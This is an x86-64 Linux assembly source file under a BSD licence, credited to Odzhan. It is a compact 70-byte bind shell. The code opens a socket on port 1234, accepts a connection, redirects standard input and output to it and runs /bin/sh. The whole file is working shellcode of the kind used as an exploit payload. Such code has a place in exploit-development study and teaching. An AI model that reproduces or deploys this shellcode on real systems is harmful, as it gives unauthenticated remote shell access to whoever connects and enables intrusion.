;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

; 70 byte bind shell for linux/x86-64
; odzhan

    bits 64
    
    mov     rax, ~0x00000000d2040002
    not     rax
    push    rax
    push    rsp
    pop     rbp
    
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    41
    pop     rax
    cdq
    push    1
    pop     rsi
    push    2
    pop     rdi
    syscall
    
    xchg    eax, edi         ; edi=sockfd
    
    ; step 2, bind to port 1234 
    ; bind(sockfd, {AF_INET,1234,INADDR_ANY}, 16)
    push    rbp
    pop     rsi
    mov     dl, 16
    mov     al, 49
    syscall
    
    ; step 3, listen
    ; listen(sockfd, 0);
    push    rax
    pop     rsi
    mov     al, 50
    syscall
    
    ; step 4, accept connections
    ; accept(sockfd, 0, 0);
    mov     al, 43
    syscall
    
    xchg    eax, edi         ; edi=sockfd
    xchg    eax, esi         ; esi=2
    
    ; step 5, assign socket handle to stdin,stdout,stderr
    ; dup2(sockfd, fileno);
dup_loop64:
    push    33               ; rax=sys_dup2
    pop     rax
    syscall
    dec     esi
    jns     dup_loop64       ; jump if not signed   
    
    ; step 6, execute /bin/sh
    ; execve("/bin//sh", 0, 0);
    cdq                      ; rdx=0
    xor     esi, esi         ; rsi=0
    push    rdx              ; zero terminator
    mov     rcx, '/bin//sh'
    push    rcx
    push    rsp
    pop     rdi
    mov     al, 59           ; rax=sys_execve
    syscall
